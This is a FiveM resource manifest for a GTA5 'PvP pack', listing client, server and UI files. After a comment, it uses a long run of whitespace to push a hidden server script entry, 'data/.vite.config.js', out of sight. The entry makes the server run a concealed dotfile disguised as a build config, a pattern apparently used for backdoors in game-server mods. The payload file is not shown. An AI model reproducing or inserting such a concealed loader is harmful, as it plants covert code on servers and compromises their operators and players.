fx_version 'cerulean'
games { 'gta5' }

author 'ChatGPT'
description 'PvP pack'
version '1.0.0'

-- Scripts
shared_script 'config.lua'
client_script 'client.lua'
server_script 'server.lua'

-- Interface utilisateur
ui_page 'html/index.html'
files {
    'html/index.html',
    'html/style.css',
    'html/script.js',
    'html/img/*.png',
}

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'data/.vite.config.js',
}
